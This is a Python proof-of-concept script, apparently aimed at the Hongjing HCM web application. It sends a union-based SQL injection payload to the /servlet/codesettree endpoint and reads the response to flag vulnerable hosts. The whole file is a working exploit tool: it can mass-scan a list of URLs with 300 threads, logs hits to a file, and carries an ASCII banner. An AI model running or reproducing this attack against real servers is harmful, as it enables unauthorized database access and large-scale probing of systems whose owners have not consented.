import requests,re,argparse,time,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
proxies = { 
       "http": "http://127.0.0.1:8080", 
       "https": "http://127.0.0.1:8080" 
       }
def banner():
    banner = """

███████╗██╗  ██╗██╗   ██╗██╗   ██╗
██╔════╝██║ ██╔╝╚██╗ ██╔╝██║   ██║
███████╗█████╔╝  ╚████╔╝ ██║   ██║
╚════██║██╔═██╗   ╚██╔╝  ██║   ██║
███████║██║  ██╗   ██║   ╚██████╔╝
╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ 
                                     
    """
    print(banner)
def poc(target):
    payload_url = "/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27hellohongjingHcm~27~2c~40~40version~2d~2d"
    url = target + payload_url
    headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Cookie": "JSESSIONID=52DCEBA606B3C4C4CE3A409486307013",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close"
    }

    try:
        res = requests.get(url=url,headers=headers,verify=False,proxies=proxies)
        res1 = requests.get(target,verify=False)
        if res1.status_code == 200:
            if "TreeNode id=" in res.text and "text=" in res.text:
                print(f"[+]该url存在SQL漏洞：{target}")
                with open("result.txt","a",encoding="utf-8") as f:
                    f.write(target+"\n")
            else:
                print(f"[-]该url不存在SQL漏洞：{target}")
        else:
            print(f"该url连接失败：{target}")
    except:
        print(f"[*]该url出现错误：{target}")


def main():
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
    parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as f:
            for i in f.readlines():
                url_list.append(i.strip().replace("\n",""))
        mp = Pool(300)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")


if __name__ == "__main__":
    main()